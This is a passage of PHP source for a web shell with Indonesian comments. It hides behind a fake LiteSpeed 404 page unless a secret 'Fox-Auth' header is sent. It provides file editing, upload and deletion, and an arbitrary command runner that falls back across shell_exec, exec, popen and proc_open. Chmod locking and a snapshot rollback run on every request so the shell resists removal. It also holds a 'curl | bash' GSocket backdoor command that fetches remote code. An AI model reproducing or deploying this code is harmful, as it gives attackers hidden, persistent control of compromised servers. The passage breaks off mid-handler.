<?php
// =========================
// PROTEKSI HEADER FOX-AUTH
// =========================
$headerName  = 'Fox-Auth';
$headerValue = 'hiddenfoxy';

$serverKey = 'HTTP_' . strtoupper(str_replace('-', '_', $headerName));
$authOk    = isset($_SERVER[$serverKey]) && $_SERVER[$serverKey] === $headerValue;

if (!$authOk) {
    ?>
<!DOCTYPE html>
<html style="height:100%">
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
    <title>404 Not Found</title>
    <style>
        @media (prefers-color-scheme:dark){body{background-color:#000!important}}
    </style>
</head>
<body style="color:#444;margin:0;font:normal 14px/20px Arial,Helvetica,sans-serif;height:100%;background-color:#fff;">
<div style="height:auto;min-height:100%;">
    <div style="text-align:center;width:800px;margin-left:-400px;position:absolute;top:30%;left:50%;">
        <h1 style="margin:0;font-size:150px;line-height:150px;font-weight:bold;">404</h1>
        <h2 style="margin-top:20px;font-size:30px;">Not Found</h2>
        <p>The resource requested could not be found on this server!</p>
    </div>
</div>
<div style="color:#f0f0f0;font-size:12px;margin:auto;padding:0 30px;position:relative;clear:both;height:100px;margin-top:-101px;background-color:#474747;border-top:1px solid rgba(0,0,0,0.15);box-shadow:0 1px 0 rgba(255,255,255,0.3) inset;">
    <br>Proudly powered by LiteSpeed Web Server
    <p>Please be advised that LiteSpeed Technologies Inc. is not a web hosting company and, as such, has no control over content found on this site.</p>
</div>
</body>
</html>
<?php
    exit;
}

// ============= BASE CONFIG =============
// AUTO DETECT HOME
$USER_HOME = isset($_SERVER['HOME'])
    ? $_SERVER['HOME']
    : (function () {
        if (function_exists('posix_getpwuid')) {
            $u = @posix_getpwuid(@posix_getuid());
            if (isset($u['dir'])) return $u['dir'];
        }
        return __DIR__;
    })();

$LOCK_DB           = rtrim($USER_HOME, "/") . "/.foxlock.json";
$UNLOCK_KEY_VALUE  = 'hiddenfoxy';
$FIM_DB            = rtrim($USER_HOME, "/") . "/.foxfim.json";          // File Integrity DB
$SESSION_DB        = rtrim($USER_HOME, "/") . "/.foxsession.json";      // Session lock state
$SESSION_SNAP_DIR  = rtrim($USER_HOME, "/") . "/.foxsession_snap";      // Snapshot folder
define('FOX_SESSION_ROOT', __DIR__);                                   // Root yang di-freeze saat Lock Session

// GSocket command – hanya ditampilkan, tidak dieksekusi
$GS_COMMAND = 'bash -c "$(curl -fsSL https://gsocket.io/y)"';

if (!file_exists($LOCK_DB)) {
    @file_put_contents($LOCK_DB, json_encode([]));
}

// ============= LOCK HELPERS =============
function load_locks($LOCK_DB){
    $raw  = @file_get_contents($LOCK_DB);
    $data = json_decode($raw,true);
    return is_array($data) ? $data : [];
}
function save_locks($LOCK_DB,$locks){
    $locks = array_values(array_unique(array_filter($locks)));
    @file_put_contents($LOCK_DB,json_encode($locks,JSON_PRETTY_PRINT));
}
function normpath($p){
    $r = realpath($p);
    return $r? rtrim($r,DIRECTORY_SEPARATOR):null;
}
function is_locked_path($path,$locks){
    $p = normpath($path);
    if(!$p) return false;
    foreach($locks as $lp){
        if(!$lp) continue;
        $lp = rtrim($lp,DIRECTORY_SEPARATOR);
        if($p===$lp) return true;
        if(strpos($p.DIRECTORY_SEPARATOR,$lp.DIRECTORY_SEPARATOR)===0) return true;
    }
    return false;
}
function is_locked_exact($path,$locks){
    $p = normpath($path);
    if(!$p) return false;
    foreach($locks as $lp){
        if(!$lp) continue;
        $lp = rtrim($lp,DIRECTORY_SEPARATOR);
        if($p===$lp) return true;
    }
    return false;
}

// file ops
function recursive_copy($src,$dst,$excludes = []){
    $srcReal = realpath($src);
    if($srcReal && in_array($srcReal,$excludes,true)) return;

    if(is_dir($src)){
        if(!is_dir($dst)) @mkdir($dst,0777,true);
        $items = @scandir($src);
        if(!$items) return;
        foreach($items as $f){
            if($f==="."||$f==="..") continue;
            $s = $src . DIRECTORY_SEPARATOR . $f;
            $d = $dst . DIRECTORY_SEPARATOR . $f;
            recursive_copy($s,$d,$excludes);
        }
    }else{
        @copy($src,$dst);
    }
}
function recursive_delete($target){
    if(is_dir($target)){
        $items = @scandir($target);
        if($items){
            foreach($items as $f){
                if($f==="."||$f==="..") continue;
                recursive_delete($target.DIRECTORY_SEPARATOR.$f);
            }
        }
        @rmdir($target);
    }else{
        @unlink($target);
    }
}
function recursive_chmod_lock($path){
    if(is_dir($path)){
        @chmod($path,0555);
        $items = @scandir($path);
        if(!$items) return;
        foreach($items as $f){
            if($f==="."||$f==="..") continue;
            recursive_chmod_lock($path.DIRECTORY_SEPARATOR.$f);
        }
    }elseif(is_file($path)){
        @chmod($path,0444);
    }
}
function recursive_chmod_unlock($path){
    if(is_dir($path)){
        @chmod($path,0777);
        $items = @scandir($path);
        if(!$items) return;
        foreach($items as $f){
            if($f==="."||$f==="..") continue;
            recursive_chmod_unlock($path.DIRECTORY_SEPARATOR.$f);
        }
    }elseif(is_file($path)){
        @chmod($path,0777);
    }
}

// ajax json response
function json_out($ok,$extra=[]){
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode(array_merge(['ok'=>$ok],$extra));
    exit;
}

// render file cards
function render_file_cards($currentDir,$locks){
    foreach(scandir($currentDir) as $item){
        if($item==="."||$item==="..") continue;
        $itemPath = $currentDir.DIRECTORY_SEPARATOR.$item;
        $isDir    = is_dir($itemPath);
        $type     = $isDir? "Folder":"File";

        // permission octal (0444 / 0555 / 0644 / 0777)
        $permOct  = file_exists($itemPath) ? substr(sprintf('%o', fileperms($itemPath)), -4) : "----";

        $lockedByDb   = is_locked_path($itemPath,$locks);
        $lockedByPerm = ($permOct === '0444' || $permOct === '0555');
        $showLock     = ($lockedByDb || $lockedByPerm);
        $isExact      = is_locked_exact($itemPath,$locks);
        $canUnlock    = $isExact || (!$lockedByDb && $lockedByPerm);
        ?>
        <div class="file-card px-3 py-3 text-xs flex flex-col justify-between">
            <div class="flex items-start space-x-3">
                <div class="file-icon <?= $isDir?'file-icon-folder':'' ?>">
                    <?php if ($isDir): ?>
                        <img src="https://cdn-icons-png.flaticon.com/512/3735/3735057.png"
                             alt="Folder" style="width:24px;height:24px;">
                    <?php else: ?>
                        <img src="https://cdn-icons-png.flaticon.com/128/9683/9683569.png"
                             alt="File" style="width:24px;height:24px;">
                    <?php endif; ?>
                </div>
                <div class="flex-1 min-w-0">
                    <div class="flex items-center justify-between">
                        <div class="truncate font-semibold text-white">
                            <?php if($isDir): ?>
                            <a href="javascript:void(0)" class="link-open-dir hover:text-sky-300"
                               data-dir="<?= htmlspecialchars($itemPath,ENT_QUOTES) ?>">
                                <?= htmlspecialchars($item) ?>
                            </a>
                            <?php else: ?>
                                <?= htmlspecialchars($item) ?>
                            <?php endif; ?>
                        </div>
                        <?php if($showLock): ?>
                            <span class="badge-lock">LOCK</span>
                        <?php endif; ?>
                    </div>
                    <div class="mt-0.5 text-[10px] text-slate-200 flex items-center justify-between">
                        <span><?= $type ?></span>
                        <span class="font-mono text-slate-100"><?= htmlspecialchars($permOct) ?></span>
                    </div>
                </div>
            </div>
            <div class="mt-3 flex flex-nowrap gap-1 text-[10px] overflow-x-auto">
                <?php if(is_file($itemPath)): ?>
                    <a href="?action=download&file=<?= urlencode($item) ?>&dir=<?= urlencode($currentDir) ?>"
                       class="px-2 py-0.5 rounded-full bg-slate-900 border border-slate-700 hover:border-sky-400 text-white flex items-center space-x-1">
                        <img src="https://cdn-icons-png.flaticon.com/128/17032/17032823.png" alt="Download" class="w-3.5 h-3.5">
                    </a>

                    <button type="button"
                        class="btn-edit px-2 py-0.5 rounded-full bg-slate-900 border border-slate-700 hover:border-sky-400 text-white flex items-center space-x-1"
                        data-file="<?= htmlspecialchars($item,ENT_QUOTES) ?>">
                        <img src="https://cdn-icons-png.flaticon.com/128/17032/17032979.png" alt="Edit" class="w-3.5 h-3.5">
                    </button>

                    <?php if(!$showLock): ?>
                    <button type="button"
                        class="btn-lock px-2 py-0.5 rounded-full bg-slate-900 border border-slate-700 hover:border-sky-400 text-white flex items-center space-x-1"
                        data-target="<?= htmlspecialchars($item,ENT_QUOTES) ?>">
                        <img src="https://cdn-icons-png.flaticon.com/128/10464/10464776.png" alt="Lock" class="w-3.5 h-3.5">
                    </button>
                    <?php endif; ?>

                    <?php if($canUnlock): ?>
                    <button type="button"
                        class="btn-unlock px-2 py-0.5 rounded-full bg-slate-900 border border-emerald-500 hover:border-emerald-400 text-white flex items-center space-x-1"
                        data-target="<?= htmlspecialchars($item,ENT_QUOTES) ?>">
                        <img src="https://cdn-icons-png.flaticon.com/512/11082/11082312.png" alt="Unlock" class="w-3.5 h-3.5">
                    </button>
                    <?php endif; ?>
                <?php endif; ?>

                <?php if($isDir): ?>
                    <?php if(!$showLock): ?>
                    <button type="button"
                        class="btn-lock px-2 py-0.5 rounded-full bg-slate-900 border border-slate-700 hover:border-indigo-400 text-white flex items-center space-x-1"
                        data-target="<?= htmlspecialchars($item,ENT_QUOTES) ?>">
                        <img src="https://cdn-icons-png.flaticon.com/128/10464/10464776.png" alt="Lock Dir" class="w-3.5 h-3.5">
                    </button>
                    <?php endif; ?>

                    <?php if($canUnlock): ?>
                    <button type="button"
                        class="btn-unlock px-2 py-0.5 rounded-full bg-slate-900 border border-emerald-500 hover:border-emerald-400 text-white flex items-center space-x-1"
                        data-target="<?= htmlspecialchars($item,ENT_QUOTES) ?>">
                        <img src="https://cdn-icons-png.flaticon.com/512/11082/11082312.png" alt="Unlock Dir" class="w-3.5 h-3.5">
                    </button>
                    <?php endif; ?>
                <?php endif; ?>

                <button type="button"
                        class="btn-delete px-2 py-0.5 rounded-full bg-slate-900 border border-red-500 hover:border-red-400 text-white flex items-center space-x-1"
                        data-target="<?= htmlspecialchars($item,ENT_QUOTES) ?>">
                    <img src="https://cdn-icons-png.flaticon.com/128/6861/6861362.png" alt="Delete" class="w-3.5 h-3.5">
                </button>
            </div>
        </div>
        <?php
    }
}

// breadcrumb
function breadcrumb_html($currentDir){
    $pathNorm = str_replace(['\\','/'],DIRECTORY_SEPARATOR,$currentDir);
    $segments = array_values(array_filter(explode(DIRECTORY_SEPARATOR,$pathNorm),'strlen'));
    $crumbLabels=[];$crumbPaths=[];$homePath=DIRECTORY_SEPARATOR;

    if(isset($segments[0]) && preg_match('/^[A-Za-z]:$/',$segments[0])){
        $drive=$segments[0];
        $homePath=$drive.DIRECTORY_SEPARATOR;
        $crumbLabels[]=$drive;
        $crumbPaths[] =$drive.DIRECTORY_SEPARATOR;
        $acc=$drive;
        for($i=1;$i<count($segments);$i++){
            $acc.=DIRECTORY_SEPARATOR.$segments[$i];
            $crumbLabels[]=$segments[$i];
            $crumbPaths[] =$acc;
        }
    }else{
        $homePath=DIRECTORY_SEPARATOR;
        $acc='';
        foreach($segments as $seg){
            $acc.=DIRECTORY_SEPARATOR.$seg;
            $crumbLabels[]=$seg;
            $crumbPaths[] =$acc;
        }
    }
    ob_start();
    echo "<a href='javascript:void(0)' class='bc-root text-sky-300 hover:underline' data-dir=\"".htmlspecialchars($homePath,ENT_QUOTES)."\">Home</a>";
    for($i=0;$i<count($crumbLabels);$i++){
        echo " <span class='text-slate-400'>/</span> ";
        echo "<a href='javascript:void(0)' class='bc-part text-sky-200 hover:underline' data-dir=\"".htmlspecialchars($crumbPaths[$i],ENT_QUOTES)."\">".htmlspecialchars($crumbLabels[$i])."</a>";
    }
    return ob_get_clean();
}

// ============= SYSTEM INFO =============
$serverIp       = $_SERVER['SERVER_ADDR']     ?? 'N/A';
$clientIp       = $_SERVER['REMOTE_ADDR']     ?? 'N/A';
$serverSoftware = $_SERVER['SERVER_SOFTWARE'] ?? 'PHP';
$osVersion      = php_uname('s').' '.php_uname('r');
$currentUser    = function_exists('posix_getpwuid')
    ? (@posix_getpwuid(@posix_getuid())['name'] ?? get_current_user())
    : get_current_user();
$phpVersion     = PHP_VERSION;

$diskTotal = @disk_total_space($USER_HOME) ?: 0;
$diskFree  = @disk_free_space($USER_HOME) ?: 0;
$diskUsed  = max($diskTotal-$diskFree,0);
$diskPct   = $diskTotal>0? round($diskUsed/$diskTotal*100,1):0;

function fmt_bytes($b){
    if($b<=0) return "0 B";
    $u=['B','KB','MB','GB','TB'];
    $i=(int)floor(log($b,1024));
    $i=max(0,min($i,count($u)-1));
    return round($b/pow(1024,$i),2).' '.$u[$i];
}

$disabled      = ini_get('disable_functions');
$disabledList  = array_filter(array_map('trim',explode(',',(string)$disabled)));
function func_status($name,$disabledList){
    if(!function_exists($name)) return 'N/A';
    return in_array($name,$disabledList,true)?'Disabled':'Enabled';
}
$execStatus      = func_status('exec',$disabledList);
$shellExecStatus = func_status('shell_exec',$disabledList);
$popenStatus     = func_status('popen',$disabledList);
$procOpenStatus  = func_status('proc_open',$disabledList);

$phpmailerStatus = (class_exists('\PHPMailer\PHPMailer\PHPMailer') || class_exists('PHPMailer'))
    ? 'Found' : 'Not Found';

// ===== DIAGNOSTIC COMMAND RUNNER (UMUM) =====
function diag_run_command($cmd, $disabledList){
    $cmdFull = $cmd . ' 2>&1';
    $output  = '';

    $isDisabled = function($f) use ($disabledList){
        return !function_exists($f) || in_array($f,$disabledList,true);
    };

    if(!$isDisabled('shell_exec')){
        $out = @shell_exec($cmdFull);
        if($out !== null && $out !== false) $output .= $out;
    } elseif(!$isDisabled('exec')){
        $lines = [];
        @exec($cmdFull,$lines);
        if($lines) $output .= implode("\n",$lines);
    } elseif(!$isDisabled('popen')){
        $h = @popen($cmdFull,'r');
        if($h){
            while(!feof($h)){ $output .= fread($h,2048); }
            @pclose($h);
        }
    } elseif(!$isDisabled('proc_open')){
        $desc = [
            0 => ['pipe','r'],
            1 => ['pipe','w'],
            2 => ['pipe','w'],
        ];
        $proc = @proc_open($cmdFull,$desc,$pipes);
        if(is_resource($proc)){
            fclose($pipes[0]);
            $output .= stream_get_contents($pipes[1]);
            $output .= stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            @proc_close($proc);
        }
    } else {
        return "[ERROR] Semua fungsi eksekusi (shell_exec/exec/popen/proc_open) disabled.";
    }

    return trim($output)==='' ? "(no output)" : $output;
}

// ===== SHELL FINDER (SCAN PHP WEB SHELL) =====
function shell_finder_scan_dir($dir, $selfPath, &$results, &$totalPhp){
    if(!is_dir($dir) || !is_readable($dir)) return;
    $items = @scandir($dir);
    if(!$items) return;

    foreach($items as $it){
        if($it === '.' || $it === '..') continue;
        $full = $dir . DIRECTORY_SEPARATOR . $it;

        if(is_dir($full)){
            shell_finder_scan_dir($full, $selfPath, $results, $totalPhp);
        } elseif(is_file($full)){
            $ext = strtolower(pathinfo($full, PATHINFO_EXTENSION));
            if($ext !== 'php') continue;

            $totalPhp++;
            $real = @realpath($full);
            if($real && $real === $selfPath) continue; // skip file ini sendiri

            $code = @file_get_contents($full);
            if($code === false) continue;

            $patterns = [
                'exec',
                'shell_exec',
                'popen',
                'proc_open',
                'passthru',
                'system',
                'pcntl_exec',
                'assert',
                'create_function',
                'eval',
                'base64_decode',
                'gzuncompress',
                'gzinflate',
                'str_rot13'
            ];
            $hits = [];

            foreach($patterns as $p){
                $re = '/\b' . preg_quote($p, '/') . '\s*\(/i';
                if(preg_match($re, $code)){
                    $hits[] = $p . '()';
                }
            }
            if(preg_match('/eval\s*\(\s*base64_decode\s*\(/i', $code)){
                $hits[] = 'eval(base64_decode())';
            }

            if($hits){
                $hits = array_values(array_unique($hits));
                $results[] = [
                    'file'     => $real ?: $full,
                    'size'     => @filesize($full),
                    'patterns' => $hits,
                ];
            }
        }
    }
}

// ===== FILE INTEGRITY CHECKER (FIM) =====
function fim_scan_tree($root, $base, &$out){
    if(!is_dir($root)) return;
    $items = @scandir($root);
    if(!$items) return;
    foreach($items as $it){
        if($it==="."||$it==="..") continue;
        $full = $root.DIRECTORY_SEPARATOR.$it;

        // skip snapshot & session/fim files
        if(strpos($full, DIRECTORY_SEPARATOR.'.foxsession_snap') !== false) continue;
        if(preg_match('~\.foxfim\.json$~',$full)) continue;
        if(preg_match('~\.foxsession\.json$~',$full)) continue;
        if(preg_match('~\.foxlock\.json$~',$full)) continue;

        if(is_dir($full)){
            fim_scan_tree($full,$base,$out);
        }elseif(is_file($full)){
            $rel = substr($full, strlen($base));
            if($rel===''||$rel===false) $rel = $full;
            $out[$rel] = [
                'hash'  => @hash_file('sha1',$full) ?: null,
                'size'  => @filesize($full),
                'mtime' => @filemtime($full),
            ];
        }
    }
}
function fim_build_baseline($root,$dbPath){
    $files=[];
    fim_scan_tree($root,$root,$files);
    $payload = [
        'root'  => $root,
        'time'  => time(),
        'files' => $files,
    ];
    @file_put_contents($dbPath,json_encode($payload,JSON_PRETTY_PRINT));
    return ['count'=>count($files),'time'=>$payload['time']];
}
function fim_check_changes($root,$dbPath){
    if(!is_file($dbPath)) return null;
    $raw = @file_get_contents($dbPath);
    $base = @json_decode($raw,true);
    if(!is_array($base) || !isset($base['files']) || !is_array($base['files'])) return null;

    $baseline = $base['files'];
    $current = [];
    fim_scan_tree($root,$root,$current);

    $added    = [];
    $deleted  = [];
    $modified = [];

    foreach($baseline as $rel=>$meta){
        if(!isset($current[$rel])){
            $deleted[] = $rel;
        }else{
            $c = $current[$rel];
            if($c['hash']!==$meta['hash'] || $c['size']!==$meta['size']){
                $modified[] = $rel;
            }
        }
    }
    foreach($current as $rel=>$meta){
        if(!isset($baseline[$rel])){
            $added[] = $rel;
        }
    }

    return [
        'baseline_time' => $base['time'] ?? null,
        'total_baseline'=> count($baseline),
        'total_current' => count($current),
        'added'         => $added,
        'deleted'       => $deleted,
        'modified'      => $modified,
    ];
}

// ===== LOCK SESSION (SNAPSHOT + AUTO-ROLLBACK) =====
function session_load_state($SESSION_DB){
    if(!is_file($SESSION_DB)) return ['locked'=>false,'snapshot'=>null];
    $raw = @file_get_contents($SESSION_DB);
    $j   = @json_decode($raw,true);
    if(!is_array($j)) return ['locked'=>false,'snapshot'=>null];
    return [
        'locked'   => !empty($j['locked']),
        'snapshot' => isset($j['snapshot']) ? $j['snapshot'] : null,
    ];
}
function session_save_state($SESSION_DB,$state){
    @file_put_contents($SESSION_DB,json_encode($state,JSON_PRETTY_PRINT));
}

// sinkronisasi root <- snapshot
function session_sync_from_snapshot($snap,$root){
    if(!is_dir($snap)) return;
    if(!is_dir($root)) @mkdir($root,0777,true);

    // copy/update dari snapshot ke root
    $items = @scandir($snap);
    if($items){
        foreach($items as $it){
            if($it==="."||$it==="..") continue;
            $s = $snap.DIRECTORY_SEPARATOR.$it;
            $r = $root.DIRECTORY_SEPARATOR.$it;

            // jangan sync snapshot/session/fim db balik ke root
            if(basename($s)==='.foxsession_snap') continue;
            if(preg_match('~\.foxfim\.json$~',$s)) continue;
            if(preg_match('~\.foxsession\.json$~',$s)) continue;
            if(preg_match('~\.foxlock\.json$~',$s)) continue;

            if(is_dir($s)){
                if(!is_dir($r)) @mkdir($r,0777,true);
                session_sync_from_snapshot($s,$r);
            }else{
                if(!file_exists($r) ||
                    @filesize($r)!==@filesize($s) ||
                    @hash_file('sha1',$r)!==@hash_file('sha1',$s)
                ){
                    @copy($s,$r);
                }
            }
        }
    }

    // hapus di root yang nggak ada di snapshot
    $rootItems = @scandir($root);
    if($rootItems){
        foreach($rootItems as $it){
            if($it==="."||$it==="..") continue;
            $r = $root.DIRECTORY_SEPARATOR.$it;
            $s = $snap.DIRECTORY_SEPARATOR.$it;

            // jangan sentuh file config shell di luar snapshot (safety minimal)
            if(preg_match('~\.fox(session|fim|lock)\.json$~',basename($r))) continue;

            if(!file_exists($s)){
                recursive_delete($r);
            }elseif(is_dir($r) && !is_dir($s)){
                recursive_delete($r);
                @copy($s,$r);
            }
        }
    }
}
function session_take_snapshot($root,$snapDir){
    if(is_dir($snapDir)) recursive_delete($snapDir);
    @mkdir($snapDir,0777,true);
    // exclude snapshot dir itself + meta json
    $excludes = [
        realpath($snapDir),
        realpath($root.DIRECTORY_SEPARATOR.'.foxfim.json'),
        realpath($root.DIRECTORY_SEPARATOR.'.foxsession.json'),
        realpath($root.DIRECTORY_SEPARATOR.'.foxlock.json'),
    ];
    recursive_copy($root,$snapDir,$excludes);
}
function session_enforce_if_locked($SESSION_DB,$SESSION_SNAP_DIR){
    $state = session_load_state($SESSION_DB);
    if(empty($state['locked']) || empty($state['snapshot']) || !is_dir($state['snapshot'])) return $state;
    // setiap request, sinkronkan __DIR__ ke snapshot
    session_sync_from_snapshot($state['snapshot'], FOX_SESSION_ROOT);
    return $state;
}

// ============= STATE (DIR & LOCKS) =============
// Enforce session lock (rollback) sebelum apa-apa
$SESSION_STATE = session_enforce_if_locked($SESSION_DB,$SESSION_SNAP_DIR);

$currentDir = __DIR__;
if(isset($_GET['dir'])){
    $req = $_GET['dir'];
    $res = realpath($req);
    if($res!==false && is_dir($res)) $currentDir=$res;
}
$locks = load_locks($LOCK_DB);

// ===== SSE HELPERS (REALTIME PROGRESS) =====
function sse_start(){
    // Matikan buffering biar beneran keluar realtime
    @ini_set('output_buffering', 'off');
    @ini_set('zlib.output_compression', 0);
    while (ob_get_level() > 0) { @ob_end_flush(); }
    @ob_implicit_flush(true);

    header('Content-Type: text/event-stream; charset=utf-8');
    header('Cache-Control: no-cache, no-transform');
    header('X-Accel-Buffering: no'); // nginx
    header('Connection: keep-alive');
}

function sse_send($event, $data){
    echo "event: {$event}\n";
    echo "data: " . json_encode($data, JSON_UNESCAPED_SLASHES|JSON_UNESCAPED_UNICODE) . "\n\n";
    @ob_flush(); @flush();
}

function session_count_items_for_snapshot($root){
    $total = 0;

    $skip = function($full) use ($root){
        // skip snapshot & meta json
        if(strpos($full, DIRECTORY_SEPARATOR.'.foxsession_snap') !== false) return true;
        if(preg_match('~\.foxfim\.json$~', $full)) return true;
        if(preg_match('~\.foxsession\.json$~', $full)) return true;
        if(preg_match('~\.foxlock\.json$~', $full)) return true;
        return false;
    };

    $it = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($root, FilesystemIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );

    foreach($it as $file){
        $full = $file->getPathname();
        if($skip($full)) continue;
        $total++;
    }
    return max(1, $total);
}

function session_take_snapshot_stream($root,$snapDir,$progressCb){
    if(is_dir($snapDir)) recursive_delete($snapDir);
    @mkdir($snapDir,0777,true);

    $total = session_count_items_for_snapshot($root);
    $done  = 0;

    $skip = function($full) use ($snapDir){
        // exclude snapshot dir itself + meta json
        if(strpos($full, DIRECTORY_SEPARATOR.'.foxsession_snap') !== false) return true;
        if(preg_match('~\.foxfim\.json$~', $full)) return true;
        if(preg_match('~\.foxsession\.json$~', $full)) return true;
        if(preg_match('~\.foxlock\.json$~', $full)) return true;
        return false;
    };

    // pastiin root ada
    if(!is_dir($root)) return ['total'=>$total,'done'=>0];

    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($root, FilesystemIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );

    foreach($iterator as $item){
        $src = $item->getPathname();
        if($skip($src)) continue;

        $rel = substr($src, strlen($root));
        if($rel === false || $rel === '') $rel = DIRECTORY_SEPARATOR;
        $dst = rtrim($snapDir, DIRECTORY_SEPARATOR) . $rel;

        if($item->isDir()){
            if(!is_dir($dst)) @mkdir($dst,0777,true);
        }else{
            // pastiin parent folder
            $parent = dirname($dst);
            if(!is_dir($parent)) @mkdir($parent,0777,true);
            @copy($src,$dst);
        }

        $done++;
        $pct = (int)floor(($done / $total) * 100);

        if(is_callable($progressCb)){
            $progressCb([
                'done'=>$done,
                'total'=>$total,
                'pct'=>$pct,
                'current'=>$src
            ]);
        }
    }

    return ['total'=>$total,'done'=>$done];
}


// ============= AJAX HANDLERS =============
if(isset($_GET['ajax']) || isset($_POST['ajax'])){
    $ajax = $_GET['ajax'] ?? $_POST['ajax'];

    // ==== FILE MANAGER BASIC ====
    if($ajax==='filelist'){
        header('Content-Type: text/html; charset=utf-8');
        render_file_cards($currentDir,$locks);
        exit;
    }
    if($ajax==='breadcrumb'){
        header('Content-Type: text/html; charset=utf-8');
        echo breadcrumb_html($currentDir);
        exit;
    }
    if($ajax==='loadfile'){
        $f = isset($_GET['file'])? basename($_GET['file']):'';
        $p = $currentDir.DIRECTORY_SEPARATOR.$f;
        if(!$f || !is_file($p)) json_out(false,['error'=>'File tidak ditemukan']);
        $c = @file_get_contents($p);
        if($c===false) json_out(false,['error'=>'Gagal baca file']);
        json_out(true,['content'=>$c,'name'=>$f]);
    }
    if($ajax==='savefile'){
        $f = isset($_POST['file'])? basename($_POST['file']):'';
        $c = $_POST['content'] ?? '';
        $p = $currentDir.DIRECTORY_SEPARATOR.$f;
        if(!$f || !is_file($p)) json_out(false,['error'=>'File tidak ditemukan']);
        if(is_locked_path($p,$locks)) json_out(false,['error'=>'File LOCK']);
        $ok = @file_put_contents($p,$c);
        if($ok===false) json_out(false,['error'=>'Gagal simpan file']);
        json_out(true,['message'=>'File tersimpan']);
    }
    if($ajax==='newitem'){
        $type = $_POST['type'] ?? 'file';
        $name = basename(trim($_POST['name'] ?? ''));
        $content = $_POST['content'] ?? '';
        if($name==='') json_out(false,['error'=>'Nama wajib diisi']);
        $targetPath = $currentDir.DIRECTORY_SEPARATOR.$name;
        if(is_locked_path($currentDir,$locks) || is_locked_path($targetPath,$locks))
            json_out(false,['error'=>'Direktori/target LOCK']);
        if($type==='folder'){
            $ok=@mkdir($targetPath,0777,true);
            if(!$ok) json_out(false,['error'=>'Gagal buat folder']);
        }else{
            $ok=@file_put_contents($targetPath,$content);
            if($ok===false) json_out(false,['error'=>'Gagal buat file']);
        }
        json_out(true,['message'=>'Berhasil membuat '.$type]);
    }
    if($ajax==='upload'){
        if(is_locked_path($currentDir,$locks)) json_out(false,['error'=>'Direktori LOCK']);
        if(!isset($_FILES['upload_file'])) json_out(false,['error'=>'File belum dipilih']);
        $fn = basename($_FILES['upload_file']['name']);
        $tp = $currentDir.DIRECTORY_SEPARATOR.$fn;
        if(!move_uploaded_file($_FILES['upload_file']['tmp_name'],$tp))
            json_out(false,['error'=>'Gagal upload file']);
        @chmod($tp,0644);
        json_out(true,['message'=>'File berhasil diupload']);
    }
    if($ajax==='bulkcopy'){
        $targetInput = $_POST['target'] ?? '';
        $destInput   = $_POST['destpath'] ?? '';
        $namesInput  = $_POST['names'] ?? '';
        $sourceFolder = realpath($currentDir.DIRECTORY_SEPARATOR.$targetInput);
        if(!$sourceFolder || !is_dir($sourceFolder)) json_out(false,['error'=>'Target folder tidak valid']);
        if(is_locked_path($sourceFolder,$locks)) json_out(false,['error'=>'Target folder LOCK']);
        $destinationDirPath = $currentDir.DIRECTORY_SEPARATOR.$destInput;
        if(is_locked_path($destinationDirPath,$locks)) json_out(false,['error'=>'Path tujuan LOCK']);
        if(!file_exists($destinationDirPath)) mkdir($destinationDirPath,0777,true);
        $destinationDir = realpath($destinationDirPath);
        $namesArray = preg_split("/[\r\n,]+/",$namesInput);
        $namesArray = array_filter(array_map('trim',$namesArray));
        if(!$namesArray) json_out(false,['error'=>'Nama folder baru kosong']);
        $results=[];
        foreach($namesArray as $nm){
            $newDest = $destinationDir.DIRECTORY_SEPARATOR.$nm;
            recursive_copy($sourceFolder,$newDest);
            $results[]=$newDest;
        }
        json_out(true,['message'=>'Bulk copy berhasil','created'=>$results]);
    }
    if($ajax==='lock'){
        $t = isset($_POST['target'])? basename($_POST['target']):'';
        $p = $currentDir.DIRECTORY_SEPARATOR.$t;
        if(!$t || !file_exists($p)) json_out(false,['error'=>'Target tidak ditemukan']);
        $rp = normpath($p);
        if(!$rp) json_out(false,['error'=>'Path tidak valid']);
        if(!is_locked_path($rp,$locks)){
            $locks[]=$rp;
            save_locks($GLOBALS['LOCK_DB'],$locks);
        }
        recursive_chmod_lock($rp);
        json_out(true,['message'=>'Target di-LOCK']);
    }
    if($ajax==='unlock'){
        $t   = isset($_POST['target'])? basename($_POST['target']):'';
        $key = $_POST['key'] ?? '';
        $p   = $currentDir.DIRECTORY_SEPARATOR.$t;
        if($key!==$GLOBALS['UNLOCK_KEY_VALUE']) json_out(false,['error'=>'Unlock key salah']);
        if(!$t || !file_exists($p)) json_out(false,['error'=>'Target tidak ditemukan']);
        $rp = normpath($p);
        if(!$rp) json_out(false,['error'=>'Path tidak valid']);
        recursive_chmod_unlock($rp);
        $locks = array_values(array_filter($locks,function($lp)use($rp){
            $lp=rtrim($lp,DIRECTORY_SEPARATOR);
            return $lp!==$rp;
        }));
        save_locks($GLOBALS['LOCK_DB'],$locks);
        json_out(true,['message'=>'Target di-UNLOCK (0777)']);
    }
    if($ajax==='delete'){
        $t = isset($_POST['target'])? basename($_POST['target']):'';
        $p = $currentDir.DIRECTORY_SEPARATOR.$t;
        if(!$t || !file_exists($p)) json_out(false,['error'=>'Target tidak ditemukan']);
        if(is_locked_path($p,$locks)) json_out(false,['error'=>'Target LOCK, nggak bisa dihapus']);
        recursive_delete($p);
        json_out(true,['message'=>'Target dihapus']);
    }
    if($ajax==='changedir'){
        $dir = $_GET['dir'] ?? '';
        if(!$dir) json_out(false,['error'=>'Direktori kosong']);
        $res = realpath($dir);
        if($res===false || !is_dir($res)) json_out(false,['error'=>'Direktori tidak valid']);
        json_out(true,['dir'=>$res]);
    }

    // ==== GSocket CMD ====
    if($ajax==='gsocket_cmd'){
        json_out(true,['cmd'=>$GLOBALS['GS_COMMAND']]);
    }

    // ==== Diagnostics (terminal umum) ====
    if($ajax==='diag'){
        global $disabledList;
        $raw = trim($_POST['cmd'] ?? '');
        if($raw==='') json_out(false,['error'=>'Command kosong']);
        $out = diag_run_command($raw,$disabledList);
        json_out(true,['cmd'=>$raw,'output'=>$out]);
    }

    // ==== SHELL FINDER ====
    if($ajax==='shellfinder'){
        @set_time_limit(300);
        $selfPath   = @realpath(__FILE__);
